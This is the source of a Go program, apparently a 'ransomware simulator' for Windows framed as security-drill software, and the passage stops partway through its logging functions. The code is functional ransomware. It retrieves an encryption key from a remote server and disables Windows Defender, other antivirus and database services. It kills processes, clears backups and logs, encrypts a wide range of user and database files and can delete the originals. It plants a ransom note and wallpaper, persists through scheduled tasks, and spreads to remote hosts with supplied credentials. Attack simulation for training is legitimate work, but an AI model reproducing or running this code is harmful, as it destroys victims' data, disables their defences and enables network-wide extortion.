// ransom_simulator_windows.go
package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	_ "embed"
	"encoding/binary"
	"encoding/json"
	"encoding/pem"
	"flag"
	"fmt"
	"io"
	mrand "math/rand"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"
)

const (
	version = "v3.8"

	// 终端心跳：每 30 秒上报一次，管理后台超过 90 秒未收到即判定离线
	heartbeatInterval = 30 * time.Second
)

// apiURL 密钥获取地址；heartbeatURL 心跳上报地址。
// 以变量形式声明，便于单元测试指向本地服务或不可达地址。
var (
	apiURL         = "https://encrypt.yangzifun.org/E56dSY"
	heartbeatURL   = "https://encrypt.yangzifun.org/api/heartbeat"
	heartbeatToken = ""
)

const (
	largeFileThreshold = 1 * 1024 * 1024 * 1024
	chunkSize          = 1 * 1024 * 1024
	headChunks         = 1
	tailChunks         = 1
	middleRandomChunks = 5
)

const ransomNoteContent = `
   [ 安全培训模拟演练通知 ]

您的部分文件已被程序处理（锁定）。

问：发生了什么？
答：这是一个受控的安全培训模拟演练。您的计算机中部分重要文件（包括文档、
照片、数据库、备份等）已被模拟处理（锁定）。在真实攻击场景中，如果没有
攻击者持有的私钥，这些文件将无法恢复。

问：如何恢复我的文件？
答：请通过以下方式获取恢复工具和密钥：

1. 访问模拟恢复页面: https://encrypt.yangzifun.org/
2. 输入您的唯一个人ID: %s

%s

[!] 这是一次安全培训模拟演练 [!]

不要惊慌！这是一个受控的模拟演练。但如果这是一次真实的攻击，你的网络
已经被完全攻陷。请借此机会评估和加强您的安全防护措施。

项目仓库链接：https://git.yangzifun.org/YZFN/ransom_simulator

免责声明与许可：
本项目遵循 MIT 许可证，请查阅 LICENSE 文件了解详情。
此工具的创建旨在赋能防御者，而非赋能攻击者。请在法律和道德允许的范围内负责任地使用。

`

// 勒索信正文中的“源文件”提示段落（依据 -remove 选项二选一）
const (
	ransomNoteKeepNotice   = "本程序不会对原文件进行删除操作。如遇原文件丢失，可通过上方链接获取私钥及恢复程序。"
	ransomNoteDeleteNotice = "本程序已删除原文件，仅保留加密后的文件；如需恢复，请通过上方链接获取私钥及恢复程序。"
)

// ransomNoteNotice 根据是否删除源文件返回对应的提示段落
func ransomNoteNotice(removeOriginal bool) string {
	if removeOriginal {
		return ransomNoteDeleteNotice
	}
	return ransomNoteKeepNotice
}

//go:embed wallpaper.ps1
var wallpaperScript string

var (
	lockFilePath            string
	ransomNoteFileName      = "!!!_如何解密你的文件_!!!.txt"
	ransomWallpaperFileName = "ransom_wallpaper.png"

	// 日志相关变量
	logEnabled        bool
	logDirectory      string
	successLogFile    *os.File
	failedLogFile     *os.File
	operationsLogFile *os.File

	// 公钥缓存，避免重复解析
	publicKeyCache     *rsa.PublicKey
	publicKeyCacheStr  string
	publicKeyCacheLock sync.RWMutex

	// 程序所在目录
	programDir string

	// 公钥变量
	publicKeyPEM string

	// 阶段2行为控制变量
	stealthMode     bool
	noStopServices  bool
	noKillProcs     bool
	noClearLogs     bool
	aggressiveDelay int

	// 目标进程列表
	targetProcessesWindows = []string{
		"notepad.exe", "wordpad.exe", "winword.exe", "excel.exe", "powerpnt.exe",
		"mspaint.exe", "sqlservr.exe", "mysqld.exe", "oracle.exe", "outlook.exe",
		"thunderbird.exe", "steam.exe", "code.exe", "powershell.exe", "cmd.exe",
		// 数据库相关进程
		"sqlwriter.exe", "sqlbrowser.exe", "mysql.exe", "pg_ctl.exe", "mongod.exe",
		"redis-server.exe", "sqlplus.exe",
		// 安全软件进程
		"mcshield.exe", "avp.exe", "bdagent.exe", "SophosUI.exe", "SEP.exe",
		"avastui.exe", "avgui.exe", "kav.exe", "kis.exe",
		// 备份软件进程
		"vssvc.exe", "wbengine.exe", "ntbackup.exe", "backupexec.exe",
	}

	// Windows数据库和安全服务
	windowsDatabaseServices = []string{
		"MSSQLSERVER", "SQLSERVERAGENT", "SQLWriter", "SQLBrowser",
		"MySQL80", "MySQL57", "PostgreSQL", "MongoDB",
		"Redis", "OracleServiceXE", "OracleServiceORCL",
	}

	windowsSecurityServices = []string{
		"WinDefend", "SecurityHealthService", "WdNisSvc", "Sense",
		"McAfeeFramework", "McShield", "SophosAgent", "SophosAlertService",
		"SEPMasterService", "SEPScanner", "SEPMonitoring", "AvastSvc",
		"AVGSvc", "Kaspersky Anti-Virus Service", "Kaspersky Security Center",
	}

	// 排除目录
	excludedDirsWindows = []string{
		"C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)",
		"System Volume Information", "$Recycle.Bin", "C:\\ProgramData",
		"C:\\System32", "C:\\SysWOW64", "C:\\Windows.old",
	}

	// 目标扩展名（增强版）
	targetExtensions = []string{
		// 文档文件
		".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx",
		".odt", ".csv", ".txt", ".rtf", ".md", ".tex", ".epub", ".one",
		// 网页文件
		".html", ".htm", ".xhtml", ".mht", ".mhtml",
		// 压缩文件
		".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz", ".tgz",
		// 图片文件
		".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tif", ".tiff",
		".svg", ".webp", ".ico", ".psd", ".ai", ".eps",
		// 数据库文件
		".sql", ".db", ".mdb", ".accdb", ".sqlite", ".sqlite3",
		".dbf", ".mdf", ".ndf", ".ldf", ".frm", ".ibd", ".myd",
		".myi", ".ibdata", ".ora", ".dmp", ".exp", ".imp", ".pdb",
		".wal", ".journal", ".rdb", ".aof", ".dump",
		// 配置文件
		".conf", ".cfg", ".ini", ".yml", ".yaml", ".xml", ".json",
		".properties", ".env", ".toml", ".config",
		// 备份文件
		".bak", ".backup", ".old", ".temp", ".tmp", ".swp", ".~*",
		// 代码文件
		".go", ".py", ".java", ".cpp", ".c", ".h", ".js", ".ts",
		".php", ".rb", ".pl", ".sh", ".bash", ".ps1", ".bat",
		// 虚拟化和容器文件
		".vmdk", ".vhd", ".vhdx", ".qcow2", ".ova", ".ovf",
		".dockerfile", ".dockerignore", ".vbox",
		// 其他重要文件
		".key", ".pem", ".crt", ".cer", ".pfx", ".p12",
		".pcap", ".log", ".tar.gz", ".tar.bz2",
	}

	// Windows数据库数据目录
	windowsDatabaseDataDirs = []string{
		"C:\\ProgramData\\MySQL\\MySQL Server\\Data",
		"C:\\Program Files\\MySQL\\MySQL Server\\Data",
		"C:\\Program Files (x86)\\MySQL\\MySQL Server\\Data",
		"C:\\Program Files\\PostgreSQL\\data",
		"C:\\Program Files (x86)\\PostgreSQL\\data",
		"C:\\Program Files\\Microsoft SQL Server\\MSSQL\\DATA",
		"C:\\Program Files (x86)\\Microsoft SQL Server\\MSSQL\\DATA",
		"C:\\MongoDB\\data",
		"D:\\MongoDB\\data",
		"C:\\Redis\\data",
		"C:\\Oracle\\oradata",
		"D:\\Oracle\\oradata",
	}

	// 加密随机数读取器
	cryptoReader = rand.Reader
)

type APIResponse struct {
	PublicKeyPEM string `json:"public_key_pem"`
	UUID         string `json:"uuid"`
	Status       string `json:"status"`
	Message      string `json:"message"`
}

type fileLog struct {
	mu   sync.Mutex
	file *os.File
}

type counters struct {
	success atomic.Uint64
	failed  atomic.Uint64
}

type encryptedChunk struct {
	Offset int64  `json:"offset"`
	Size   int    `json:"size"`
	Nonce  []byte `json:"nonce"`
	Data   []byte `json:"data"`
}

type chunkInfo struct {
	Offset int64
	Size   int64
}

// options 汇总全部命令行参数（含定时触发 / 攻击面侦察 / 远程横向加密）
type options struct {
	workers         int
	dryRun          bool
	extensions      string
	directory       string
	removeOriginal  bool
	logFlag         bool
	stealthMode     bool
	noStopServices  bool
	noKillProcs     bool
	noClearLogs     bool
	aggressiveDelay int

	// 后台驻留与密钥保留
	resident bool
	keepKey  bool

	// 定时任务后台化
	foreground  bool
	noAutostart bool
	daemonChild bool

	// 定时触发
	delay            time.Duration
	atTime           string
	randomDelay      time.Duration
	persistSchedule  bool
	scheduleTaskName string
	scheduleCleanup  bool
	scheduledRun     bool

	// 模拟攻击扫描（攻击面侦察）
	scan            bool
	scanOnly        bool
	scanTargets     string
	scanTargetsFile string
	scanPorts       string
	scanWorkers     int
	scanTimeout     time.Duration
	scanICMP        bool

	// 远程横向加密编排
	remoteHosts     string
	remoteHostsFile string
	remoteAuto      bool
	remoteUser      string
	remotePass      string
	remoteDomain    string
	remoteKey       string
	remotePort      int
	remoteMethod    string
	remoteStaging   string
	remoteArgs      string
	remoteConfirm   bool
	remoteCleanup   bool
}

// remoteRequested 判断是否请求了远程横向加密
func (o *options) remoteRequested() bool {
	return strings.TrimSpace(o.remoteHosts) != "" ||
		strings.TrimSpace(o.remoteHostsFile) != "" ||
		o.remoteAuto
}

func main() {
	forceReleaseLock()

	fmt.Println("==================================================")
	fmt.Println("      勒索软件模拟器 - Windows增强版      ")
	fmt.Printf("                版本: %s\n", version)
	fmt.Println("==================================================")
	time.Sleep(1 * time.Second)

	// 获取程序所在目录
	initProgramDir()

	fmt.Println("\n[阶段 1: 渗透与持久化]")
	fmt.Print("[*] 通过互斥锁建立持久化... ")
	if !createSingleInstanceLock() {
		fmt.Println("失败. [IOC] 检测到另一个实例正在运行。程序终止。")
		os.Exit(1)
	}
	fmt.Println("成功.")
	defer cleanupLockFile()

	fs := flag.NewFlagSet("ransom_simulator", flag.ExitOnError)
	opt := setupFlags(fs)
	if err := fs.Parse(os.Args[1:]); err != nil {
		_, _ = fmt.Fprintf(os.Stderr, "错误: 解析命令行参数失败: %v\n", err)
		os.Exit(1)
	}

	stealthMode = opt.stealthMode
	noStopServices = opt.noStopServices
	noKillProcs = opt.noKillProcs
	noClearLogs = opt.noClearLogs
	aggressiveDelay = opt.aggressiveDelay

	initLogging(opt.logFlag)
	defer closeLogFiles()

	// 远程编排模式：指定了远程目标但未指定本地 -dir，则只做远程横向加密
	remoteOnly := opt.remoteRequested() && strings.TrimSpace(opt.directory) == ""

	// 计划任务唤起后的运行在结束时自动清理任务
	if wasScheduledRun() && opt.scheduleCleanup {
		defer func() {
			cleanupPersistentSchedule(opt.scheduleTaskName)
			markScheduleDone(opt)
		}()
	}

	// ---------- 阶段 0: 定时触发（--delay / --at / --random-delay / --persist-schedule）----------
	if !wasScheduledRun() {
		startAt, needWait, err := resolveStartTime(opt)
		if err != nil {
			fmt.Printf("[!] 定时参数错误: %v\n", err)
			os.Exit(2)
		}
		if opt.persistSchedule {
			if err := registerPersistentSchedule(opt, startAt); err != nil {
				fmt.Printf("[!] 注册计划任务失败，回退为进程内等待: %v\n", err)
			} else {
				fmt.Println("[*] 计划任务已注册，当前进程退出；到点后由系统唤起并直接执行。")
				if logEnabled {
					logOperation("计划任务注册完成，主进程退出")
				}
				countdown("此终端将在", 5)
				return
			}
		}

		// 已完成的定时任务子进程：清理开机自启后直接退出，避免重启后重复执行
		if isDaemonChild() && isScheduleDone(opt) {
			fmt.Println("[*] 检测到该定时任务已完成，子进程退出。")
			removeAutoStart(opt.scheduleTaskName)
			return
		}

		// 显式定时（--delay / --at）：默认转入后台运行并注册开机自启
		explicitSchedule := opt.delay > 0 || strings.TrimSpace(opt.atTime) != ""
		if needWait && explicitSchedule && !opt.foreground && !isDaemonChild() {
			clearScheduleDone(opt)
			autoRegistered := false
			if !opt.noAutostart {
				if regErr := registerAutoStart(opt, startAt); regErr != nil {
					fmt.Printf("[!] 注册开机自启失败（重启后需手动启动）: %v\n", regErr)
				} else {
					autoRegistered = true
				}
			}
			logPath := scheduleLogPath()
			pid, spawnErr := spawnDaemon(buildDaemonArgs(startAt), logPath)
			if spawnErr == nil {
				fmt.Println()
				fmt.Printf("[+] 定时任务已转入后台运行: PID %d\n", pid)
				fmt.Printf("[*] 计划启动时间: %s\n", startAt.Format("2006-01-02 15:04:05"))
				if autoRegistered {
					fmt.Println("[+] 已注册开机自启，重启后定时任务仍然有效")
				}
				fmt.Printf("[*] 后台日志: %s\n", logPath)
				fmt.Println("[*] 当前终端可安全关闭；如需前台等待请加 --foreground")
				return
			}
			fmt.Printf("[!] 转入后台失败，回退前台等待: %v\n", spawnErr)
		}

		if needWait {
			if !waitUntilStart(startAt, opt) {
				return
			}
		}
	}

	// 后台子进程运行结束后清理任务与开机自启
	if isDaemonChild() && opt.scheduleCleanup {
		defer func() {
			cleanupPersistentSchedule(opt.scheduleTaskName)
			markScheduleDone(opt)
		}()
	}

	if opt.scanOnly {
		fmt.Println(">>> 已激活 [仅侦察模式]，不会执行任何加密或破坏性操作。")
	} else {
		showWarning(opt.dryRun)
	}

	// ---------- 阶段 1.5: 攻击面侦察（模拟攻击扫描）----------
	var recon *reconReport
	if opt.scan || opt.scanOnly || opt.remoteAuto {
		recon = runRecon(opt)
	}
	if opt.scanOnly {
		fmt.Println("\n================== [ 侦察完成 ] ==================")
		if recon != nil {
			fmt.Printf("  - 扫描目标:        %d\n", recon.Summary.Targets)
			fmt.Printf("  - 存活主机:        %d\n", recon.Summary.AliveHosts)
			fmt.Printf("  - 开放端口:        %d\n", recon.Summary.OpenPorts)
			fmt.Printf("  - 高危主机:        %d\n", recon.Summary.HighRisk)
			fmt.Printf("  - 可远程投递:      %d\n", recon.Summary.RemoteReady)
		}
		fmt.Println("[*] --scan-only 已启用: 不执行加密与破坏性操作。")
		if logEnabled {
			logOperation("--scan-only 模式结束（仅侦察）")
		}
		countdown("此终端将在", 10)
		return
	}
	fmt.Println("\n[阶段 2: 防御规避与发现]")

	// 终端心跳：启动后立即上报，之后每 30 秒一次，供管理后台统计在线终端
	hbMode := "attack"
	if opt.dryRun {
		hbMode = "dry-run"
	} else if remoteOnly {
		hbMode = "remote"
	}
	startHeartbeat(hbMode)
	defer stopHeartbeat()

	if opt.dryRun {
		fmt.Println("[*] [演习模式] 跳过所有破坏性操作。")
	} else if remoteOnly {
		fmt.Println("[*] [远程编排模式] 跳过本地破坏性操作，仅执行远程横向加密。")
	} else {

		if !noStopServices {
			fmt.Println("\n[+] 停止数据库和安全服务...")
			stopWindowsServices()
			stopSecurityServices()
		} else {
			fmt.Println("\n[*] [跳过] 停止服务操作")
		}

		fmt.Println("\n[+] 清理数据库内存和缓存...")
		cleanWindowsDatabaseMemory()
		cleanDatabaseMemory()

		if !noKillProcs {
			killLockingProcesses()
		} else {
			fmt.Println("\n[*] [跳过] 终止占用文件的进程")
		}

		if !noClearLogs {
			simulateDestructiveActions()
		} else {
			fmt.Println("\n[*] [跳过] 清除备份和日志文件")
		}

		if stealthMode {
			fmt.Println("\n[+] [隐身模式] 执行额外清理...")
			disableProcessWatchdogs()
			unmountDatabaseConnections()
			clearSystemCache()
		}
	}

	extFilter := make(map[string]bool)
	if opt.extensions != "" {
		exts := strings.Split(opt.extensions, ",")
		for _, ext := range exts {
			ext = strings.TrimSpace(ext)
			if ext != "" {
				if !strings.HasPrefix(ext, ".") {
					ext = "." + ext
				}
				extFilter[strings.ToLower(ext)] = true
			}
		}
		fmt.Printf("[*] 使用指定的扩展名: %v\n", getKeys(extFilter))
	} else {
		for _, ext := range targetExtensions {
			extFilter[ext] = true
		}
		fmt.Println("[*] 使用增强扩展名列表 (包含数据库文件、配置文件、备份文件等)")
	}

	var scanRoots []string
	encryptAllFormats := false
	if opt.directory != "" {
		dirs := strings.Split(opt.directory, ",")
		for _, dir := range dirs {
			dir = strings.TrimSpace(dir)
			if dir != "" {
				scanRoots = append(scanRoots, dir)
			}
		}
		fmt.Printf("[*] 扫描指定目录: %v\n", scanRoots)
		if len(scanRoots) > 0 {
			encryptAllFormats = true
			fmt.Println("[*] 目录定位模式已激活: 将加密指定目录下的【所有格式】文件")
		}
	}

	var filesToProcess []string
	if remoteOnly {
		fmt.Println("[*] 远程编排模式(-dir 未指定): 跳过本地文件扫描，仅执行远程横向加密。")
	} else {
		fmt.Println("[*] 正在扫描文件系统以查找有价值的目标...")
		filesToProcess = scanFiles(extFilter, scanRoots, encryptAllFormats)
		if len(filesToProcess) == 0 {
			fmt.Println("[!] 未找到任何有价值的目标文件。")
			if !opt.remoteRequested() {
				fmt.Println("[!] 任务中止。")
				stopHeartbeat()
				os.Exit(0)
			}
		} else {
			fmt.Printf("[+] 目标捕获完成。已识别 %d 个待加密文件。\n", len(filesToProcess))
		}
	}

	var stats counters
	var finalUUID = "本地密钥模式"
	var publicKeyValue, publicKeyFilePath, keyCachePath string

	// 统一获取密钥：本地加密（非演习）与远程编排共用同一密钥，避免生成两份 UUID
	if !opt.dryRun || opt.remoteRequested() {
		uuid, pem, source, err := acquireKeys()
		if err != nil {
			fmt.Printf("[!] 获取密钥失败: %v\n", err)
			remindLocalKey()
			if !opt.dryRun {
				// 保留窗口并给出可操作提示，避免双击运行时窗口一闪而过
				countdown("此终端将在", 15)
				stopHeartbeat()
				os.Exit(1)
			}
		} else {
			finalUUID = uuid
			publicKeyValue = pem
			setHeartbeatKey(uuid)
			rememberKey(uuid, pem)
			if opt.keepKey {
				if path, cerr := persistKeyCache(uuid, pem, hbMode, opt.removeOriginal); cerr != nil {
					fmt.Printf("[!] 密钥缓存写入失败: %v\n", cerr)
				} else {
					keyCachePath = path
					fmt.Printf("[+] 密钥已保存在内存与本地缓存（不会被清理）: %s\n", path)
				}
			}
			fmt.Printf("[*] 当前密钥来源: %s\n", source)
			if p, perr := ensureLocalPublicKeyFile(uuid, pem); perr != nil {
				fmt.Printf("[!] %v\n", perr)
			} else {
				publicKeyFilePath = p
			}
		}
	}

	if opt.dryRun {
		fmt.Println("\n[阶段 3: 载荷部署 (演习模式下跳过)]")
		fmt.Println("[*] 以下文件在真实攻击中将被加密:")
		for _, f := range filesToProcess {
			fmt.Println("  -", f)
		}
	} else if len(filesToProcess) == 0 {
		fmt.Println("\n[阶段 3: 载荷部署]")
		fmt.Println("[*] 无本地目标文件，跳过本地加密。")
	} else {
		fmt.Println("\n[阶段 3: 载荷部署]")
		fmt.Printf("[*] 初始化 %d 个加密线程。开始执行载荷...\n", opt.workers)
		runEncryptionWorkers(filesToProcess, opt.workers, &stats, finalUUID, publicKeyValue, opt.removeOriginal)
		fmt.Println("\n[+] 载荷执行完毕。")
	}

	if !opt.dryRun && !remoteOnly {
		fmt.Println("\n[阶段 4: 勒索信增强]")
		noteContent := fmt.Sprintf(ransomNoteContent, finalUUID, ransomNoteNotice(opt.removeOriginal))
		userProfile, err := os.UserHomeDir()
		if err == nil {
			desktopPath := filepath.Join(userProfile, "Desktop")
			_ = os.WriteFile(filepath.Join(desktopPath, ransomNoteFileName), []byte(noteContent), 0644)
		}
		createRansomWallpaper(finalUUID, opt.removeOriginal)
	} else if remoteOnly {
		fmt.Println("\n[阶段 4: 勒索信增强]")
		fmt.Println("[*] [远程编排模式] 跳过本地勒索信投放与桌面壁纸篡改。")
	}

	// ---------- 阶段 5: 远程横向加密编排 ----------
	var remoteRep *remoteReport
	if opt.remoteRequested() {
		remoteRep = runRemoteEncryption(opt, recon, publicKeyFilePath)
	}

	fmt.Println("\n================== [ 任务完成 ] ==================")
	if opt.dryRun {
		fmt.Printf("  - 模式:            演习模式 (Dry Run)\n")
		fmt.Printf("  - 发现目标:        %d\n", len(filesToProcess))
	} else {
		fmt.Printf("  - 模式:            实时攻击\n")
		fmt.Printf("  - 已加密文件:      %d\n", stats.success.Load())
		fmt.Printf("  - 加密失败:        %d\n", stats.failed.Load())
	}
	if recon != nil {
		fmt.Printf("  - 侦察结果:        存活 %d / 目标 %d, 开放端口 %d, 高危主机 %d, 可远程投递 %d\n",
			recon.Summary.AliveHosts, recon.Summary.Targets, recon.Summary.OpenPorts,
			recon.Summary.HighRisk, recon.Summary.RemoteReady)
	}
	if opt.persistSchedule && !wasScheduledRun() {
		fmt.Printf("  - 计划任务:        %s\n", opt.scheduleTaskName)
	}
	if remoteRep != nil {
		fmt.Printf("  - 远程编排:        目标 %d 台, 模式 %s\n", len(remoteRep.Results), modeLabel(remoteRep.Mode))
		if remoteRep.JSONFile != "" {
			fmt.Printf("  - 远程报告:        %s\n", remoteRep.JSONFile)
		}
	}

	// 输出日志文件位置
	if logEnabled {
		fmt.Println("\n================== [ 日志文件 ] ==================")
		fmt.Printf("  - 成功日志:        %s\n", filepath.Join(logDirectory, "success_encrypted.log"))
		fmt.Printf("  - 失败日志:        %s\n", filepath.Join(logDirectory, "failed_encrypted.log"))
		fmt.Printf("  - 操作日志:        %s\n", filepath.Join(logDirectory, "operations.log"))
		fmt.Println("====================================================")
	}

	if opt.resident {
		runResidentLoop(finalUUID, keyCachePath)
	} else {
		countdown("此终端将在", 10)
	}
}

// 初始化程序所在目录
func initProgramDir() {
	exePath, err := os.Executable()
	if err != nil {
		// 如果无法获取可执行文件路径，则使用当前工作目录
		programDir, _ = os.Getwd()
		fmt.Printf("[!] 警告: 无法获取程序路径，使用当前工作目录: %s\n", programDir)
	} else {
		programDir = filepath.Dir(exePath)
		fmt.Printf("[*] 程序所在目录: %s\n", programDir)
	}
}

// publicKeyFilePattern 严格公钥文件名：public_key_<uuid>.pem
var publicKeyFilePattern = regexp.MustCompile(`^public_key_([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})\.pem$`)

// uuidFromKeyFileName 从公钥文件名提取 UUID；文件名不含合法 UUID 时返回空串。
func uuidFromKeyFileName(name string) string {
	if m := publicKeyFilePattern.FindStringSubmatch(name); m != nil && len(m) == 2 && isValidUUID(m[1]) {
		return m[1]
	}
	return ""
}

// uuidFromPublicKey 依据公钥指纹生成稳定 UUID（RFC 4122 v4 形式）。
// 用于文件名不含 UUID 的本地公钥，保证同一把公钥每次运行得到同一个 ID。
func uuidFromPublicKey(pub *rsa.PublicKey) string {
	der, err := x509.MarshalPKIXPublicKey(pub)
	if err != nil {
		return "本地密钥模式"
	}
	sum := sha256.Sum256(der)
	sum[6] = (sum[6] & 0x0f) | 0x40
	sum[8] = (sum[8] & 0x3f) | 0x80
	return fmt.Sprintf("%x-%x-%x-%x-%x", sum[0:4], sum[4:6], sum[6:8], sum[8:10], sum[10:16])
}

// 验证UUID格式
func isValidUUID(uuid string) bool {
	if len(uuid) != 36 {
		return false
	}

	// 检查格式: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
	parts := strings.Split(uuid, "-")
	if len(parts) != 5 {
		return false
	}

	lengths := []int{8, 4, 4, 4, 12}
	for i, part := range parts {
		if len(part) != lengths[i] {
			return false
		}
		// 检查是否为十六进制字符
		for _, ch := range part {
			if !((ch >= '0' && ch <= '9') || (ch >= 'a' && ch <= 'f') || (ch >= 'A' && ch <= 'F')) {
				return false
			}
		}
	}

	return true
}

// parseRSAPublicKey 解析 PEM 编码的 RSA 公钥（PKIX 或 PKCS#1）。
func parseRSAPublicKey(content []byte) (*rsa.PublicKey, error) {
	block, _ := pem.Decode(content)
	if block == nil {
		return nil, fmt.Errorf("无效的 PEM 格式")
	}
	if block.Type != "PUBLIC KEY" && block.Type != "RSA PUBLIC KEY" {
		return nil, fmt.Errorf("PEM 类型应为 PUBLIC KEY / RSA PUBLIC KEY，实际为 %q", block.Type)
	}
	pkixPub, pkixErr := x509.ParsePKIXPublicKey(block.Bytes)
	if pkixErr == nil {
		pub, ok := pkixPub.(*rsa.PublicKey)
		if !ok {
			return nil, fmt.Errorf("公钥不是 RSA 类型")
		}
		return pub, nil
	}
	if pkcs1Pub, pkcs1Err := x509.ParsePKCS1PublicKey(block.Bytes); pkcs1Err == nil {
		return pkcs1Pub, nil
	}
	return nil, fmt.Errorf("公钥解析失败: %v", pkixErr)
}

// keySearchDirs 返回本地公钥的查找目录：程序目录优先，其次当前工作目录，
// 最后是用户级密钥缓存目录。
func keySearchDirs() []string {
	dirs := []string{programDir}
	add := func(dir string) {
		if strings.TrimSpace(dir) == "" {
			return
		}
		for _, existing := range dirs {
			if strings.EqualFold(existing, dir) {
				return
			}
		}
		dirs = append(dirs, dir)
	}
	if wd, err := os.Getwd(); err == nil {
		add(wd)
	}
	add(keyCacheDir())
	return dirs
}

// keyCacheDir 保存联网成功后下发的公钥副本，供程序目录不可写时断网回退。
func keyCacheDir() string {
	base, err := os.UserConfigDir()
	if err != nil || strings.TrimSpace(base) == "" {
		return ""
	}
	return filepath.Join(base, "RansomSimulator", "keys")
}

// cachePublicKeyCopy 把 API 下发的公钥副本落到用户级缓存目录（失败仅忽略），
// 保证程序目录只读时，下一次断网运行仍能回退到本地密钥。
func cachePublicKeyCopy(uuid, pemText string) {
	dir := keyCacheDir()
	if dir == "" || strings.TrimSpace(uuid) == "" {
		return
	}
	if err := os.MkdirAll(dir, 0700); err != nil {
		return
	}
	_ = os.WriteFile(filepath.Join(dir, fmt.Sprintf("public_key_%s.pem", uuid)), []byte(pemText), 0600)
}

// loadLocalKey 从本机查找可用的 RSA 公钥文件。
// 程序目录优先；兼容 public_key_<uuid>.pem 以及 public_key.pem、任意 *.pem 文件名。
// 文件名不含 UUID 时按公钥指纹生成稳定 UUID。
func loadLocalKey() (uuid, pemText, filePath string, err error) {
	var reasons []string
	for _, dir := range keySearchDirs() {
		entries, readErr := os.ReadDir(dir)
		if readErr != nil {
			if !os.IsNotExist(readErr) {
				reasons = append(reasons, fmt.Sprintf("无法读取目录 %s: %v", dir, readErr))
			}
			continue
		}

		type candidate struct {
			name string
			rank int
		}
		var cands []candidate
		for _, entry := range entries {
			if entry.IsDir() {
				continue
			}
			name := entry.Name()
			lower := strings.ToLower(name)
			if !strings.HasSuffix(lower, ".pem") {
				continue
			}
			rank := 3 // 任意 .pem
			if publicKeyFilePattern.MatchString(name) {
				rank = 1 // public_key_<uuid>.pem
			} else if strings.HasPrefix(lower, "public_key") {
				rank = 2 // public_key.pem / public_key_xxx.pem
			}
			cands = append(cands, candidate{name: name, rank: rank})
		}
		sort.SliceStable(cands, func(i, j int) bool {
			if cands[i].rank != cands[j].rank {
				return cands[i].rank < cands[j].rank
			}
			return cands[i].name < cands[j].name
		})

		for _, c := range cands {
			full := filepath.Join(dir, c.name)
			content, readErr := os.ReadFile(full)
			if readErr != nil {
				reasons = append(reasons, fmt.Sprintf("读取 %s 失败: %v", full, readErr))
				continue
			}
			pub, parseErr := parseRSAPublicKey(content)
			if parseErr != nil {
				reasons = append(reasons, fmt.Sprintf("%s 不是可用公钥: %v", c.name, parseErr))
				continue
			}
			id := uuidFromKeyFileName(c.name)
			if id == "" {
				id = uuidFromPublicKey(pub)
			}
			return id, string(content), full, nil
		}
	}

	msg := fmt.Sprintf("程序目录 %s 下未找到可用公钥（期望 public_key_<uuid>.pem，也兼容 public_key.pem 等 *.pem）", programDir)
	if len(reasons) > 0 {
		msg += "；" + strings.Join(reasons, "；")
	}
	return "", "", "", fmt.Errorf("%s", msg)
}

// remindLocalKey 在完全找不到密钥时给出可操作提示（由调用方负责停留窗口）。
func remindLocalKey() {
	fmt.Println()
	fmt.Println("==================================================")
	fmt.Println("[!] 无法获取加密密钥，任务已中止")
	fmt.Println("==================================================")
	fmt.Println("[*] 处理方式:")
	fmt.Println("    1. 断网环境: 把公钥文件放到程序目录，文件名形如 public_key_<uuid>.pem")
	fmt.Printf("       程序目录: %s\n", programDir)
	fmt.Println("       （也兼容 public_key.pem 等任意 *.pem 公钥文件）")
	fmt.Println("    2. 有网络:   检查网络/代理后重新运行，联网成功后会自动在本地缓存公钥")
	fmt.Println("==================================================")
	fmt.Println()
}

// 初始化日志系统
func initLogging(enableLog bool) {
	logEnabled = enableLog
	if !logEnabled {
		return
	}

	// 使用程序所在目录作为日志目录
	logDirectory = programDir

	fmt.Printf("[*] 日志系统已启用，日志将输出到: %s\n", logDirectory)

	// 创建日志文件
	var err1, err2, err3 error
	successLogFile, err1 = os.OpenFile(
		filepath.Join(logDirectory, "success_encrypted.log"),
		os.O_CREATE|os.O_WRONLY|os.O_APPEND,
		0644,
	)

	failedLogFile, err2 = os.OpenFile(
		filepath.Join(logDirectory, "failed_encrypted.log"),
		os.O_CREATE|os.O_WRONLY|os.O_APPEND,
		0644,
	)

	operationsLogFile, err3 = os.OpenFile(
		filepath.Join(logDirectory, "operations.log"),
		os.O_CREATE|os.O_WRONLY|os.O_APPEND,
		0644,
	)

	if err1 != nil || err2 != nil || err3 != nil {
		fmt.Printf("[!] 无法创建日志文件: success=%v, failed=%v, operations=%v\n", err1, err2, err3)
		logEnabled = false
	} else {
		// 写入日志文件头
		timestamp := time.Now().Format("2006-01-02 15:04:05")
		header := fmt.Sprintf("=================== 勒索软件模拟器日志 ===================\n")
		header += fmt.Sprintf("程序版本: %s\n", version)
		header += fmt.Sprintf("开始时间: %s\n", timestamp)
		header += fmt.Sprintf("运行参数: %s\n", strings.Join(os.Args, " "))
		header += fmt.Sprintf("工作目录: %s\n", programDir)
		header += fmt.Sprintf("=========================================================\n\n")

		_, _ = successLogFile.WriteString(header)
		_, _ = failedLogFile.WriteString(header)
		_, _ = operationsLogFile.WriteString(header)
	}
}

// 关闭日志文件
func closeLogFiles() {
	if logEnabled {
		if successLogFile != nil {
			_ = successLogFile.Close()
		}
		if failedLogFile != nil {
			_ = failedLogFile.Close()
		}
		if operationsLogFile != nil {
			_ = operationsLogFile.Close()
		}
	}
}

// 记录成功加密的文件
func logSuccess(filePath string) {
	if !logEnabled || successLogFile == nil {
		return
	}

	timestamp := time.Now().Format("2006-01-02 15:04:05")
	logEntry := fmt.Sprintf("[%s] SUCCESS: %s -> %s.encrypted\n",
		timestamp, filePath, filePath)

	successLogFile.WriteString(logEntry)

	// 同时记录到操作日志
	logOperation(fmt.Sprintf("成功加密: %s", filePath))
}

// 记录加密失败的文件
func logFailed(filePath string, errorMsg string) {
